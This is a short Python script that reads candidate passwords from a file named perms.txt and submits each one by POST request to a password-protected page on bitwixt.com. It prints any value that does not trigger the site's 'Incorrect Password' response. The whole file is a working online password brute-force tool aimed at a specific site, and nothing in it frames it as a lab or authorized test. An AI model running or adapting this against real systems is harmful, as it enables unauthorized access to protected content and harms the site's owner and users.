import requests
import re
import string
from itertools import permutations

imWrong = "<p style=\"text-align:center;color:red\"><strong>Incorrect Password</strong></font></p>"

with open("perms.txt", "r") as file:
	for line in file:
		for num in line.split():
			r = requests.post("http://bitwixt.com/jsite/dashboard-worksheets", \
				data={"password": num})
			if(re.search(imWrong, r.text)):
				print("Yeah, well")
			else:
				print(num)

